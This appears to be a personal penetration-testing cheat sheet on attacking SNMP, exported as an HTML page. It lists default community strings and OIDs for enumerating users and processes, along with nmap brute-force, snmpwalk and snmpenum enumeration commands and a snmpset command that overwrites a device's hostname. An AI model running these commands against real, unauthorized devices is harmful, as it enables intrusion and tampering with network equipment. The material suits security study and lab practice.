<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SNMP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SNMP</h1><br/><p><h2>INtro</h2><ul><li>• <small>• </small><strong><small>Simple Network Management Protocol </small></strong><small>(SNMP) is a protocol which can be used by administrators to remotely manage a computer or network device. </small></li><li><small>There are typically 2 modes of remote SNMP monitoring. </small><ul><li><small> &#39;READ&#39; and &#39;WRITE&#39; (or PUBLIC and PRIVATE).</small></li><li><small>If an attacker is able to guess a </small><strong><small>PUBLIC</small></strong><small> community string, they would be able to read SNMP data (depending on which MIBs are installed) from the remote device.</small><ul><li><small>This information might include system time, IP addresses, interfaces, processes running, et</small><small>c</small></li></ul></li><li><small>If an attacker is able to guess a </small><strong><small>PRIVATE</small></strong><small> community string (WRITE or &#39;writeall&#39; access), they will have the ability to change information on the remote machine.</small><ul><li><small>This could be a huge security hole, enabling remote attackers to wreak complete havoc such as routing network traffic, initiating processes, etc. In essence, &#39;writeall&#39; access will give the remote attacker full administrative rights over the remote machine.</small></li></ul></li></ul></li></ul></p><p></p><p><h2>COmmon snmp community strings</h2></p><p><div class="codebox"><pre>public<br />private<br />community</pre></div></p><p><h2>SNMP</h2></p><p>1.3.6.1.2.1.25.1.6.0 System Processes</p><p>1.3.6.1.2.1.25.4.2.1.2 Running Programs</p><p>1.3.6.1.2.1.25.4.2.1.4: Processes Path</p><p>1.3.6.1.2.1.25.2.3.1.4: Storage Units</p><p>1.3.6.1.2.1.25.6.3.1.2: Software Name</p><p>1.3.6.1.4.1.77.1.2.25: User Accounts</p><p>1.3.6.1.2.1.6.13.1.3: TCP Local Ports<h3></h3></p><p><h3></h3><strong><h2> snmp versions</h2></strong></p><p> •  SNMPv1: Main one, it is still the most frequent, the authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text). Version 2 and 2c send the traffic in plain text also and uses a community string as authentication.<ul><li>SNMPv3: Uses a better authentication form and the information travels encrypted using (dictionary attack could be performed but would be much harder to find the correct creds that inn SNMPv1 and v2).</li></ul></p><p> </p><p> community strings<h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h2>snmp  bruteforce:</h2><ul><li><h3> nmap -sU --script snmp-brute 192.168.1.50 --script-args snmp-brute.communitiesdb=dict.txt -p 161</h3></li><li><h3> metsaploit attack</h3><ul><li><h3>  snmp_login auxilliary</h3></li></ul></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h2>snmp exploits</h2><h3> </h3></p><p> <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sudo</span> nmap -sU -p 161 --script snmp-processes 192.10.232.3<br />   ◇ <span style="color:#ff9d00;font-weight:700">sudo</span> nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes <span style="color:#7f0044;font-weight:400">$target</span><br /><span style="color:#ff9d00;font-weight:700">sudo</span> nmap -sU -p 161 --script /usr/share/nmap/scripts/snmp-win32-users.nse <span style="color:#7f0044;font-weight:400">$target</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">### snmpwalk filtering MIBS </span><br /><span style="color:#0088ff;font-weight:400">###dump MIB tree:  open tcp ports;windows process ; installed software </span><br /><span style="color:#0088ff;font-weight:400">#### runing binary could contain passwords </span><br />snmpwalk -c public -v2c <span style="color:#7f0044;font-weight:400">$target</span> <br /><br /><span style="color:#ff9d00;font-weight:700">grep</span> -oP <span style="color:#3ad900;font-weight:400">&#39;::.*?\.&#39;</span> snmpwalk.txt <span style="color:#ff9d00;font-weight:700">|sort|uniq</span> -c <span style="color:#ff9d00;font-weight:700">|sort</span> -n<br /><br /><span style="color:#0088ff;font-weight:400">### automated walking</span><br /><br />snmpenum <span style="color:#7f0044;font-weight:400">$target</span> public /usr/share/snmpenum/linux.txt<br /><br /><span style="color:#0088ff;font-weight:400">## get shell</span><br /><br />rw =<span style="color:#ff9d00;font-weight:700">&gt;</span> sometimes shell<br /><br /><span style="color:#0088ff;font-weight:400">## enumerate more with externded MIBS</span><br /><br />snmpwalk -v<span style="color:#7f0044;font-weight:400">$version</span> -c public <span style="color:#7f0044;font-weight:400">$target</span> NET-SNMP-EXTEND-MIB::nsExtendOutputFull<br />snmpwalk -v1 -c public kiero NET-SNMP-EXTEND-MIB::nsExtendOutputFull</pre></div> </p><p><strong><h2>post exploitation attack</h2></strong></p><p></p><p><ul><li>snmpset -v1 -c router-write 192.168.1.50 &lt;field to change&gt; -s &lt;newvalue&gt;</li><li>snmpset -v1 -c router-write 192.168.1.50  iso.3.6.1.2.1.1.5.0 -s Hacked</li></ul></p><p></p><p></p><p><ul><li>less missions co,sultant r&amp;d </li></ul></p></div>
</body>
</html>
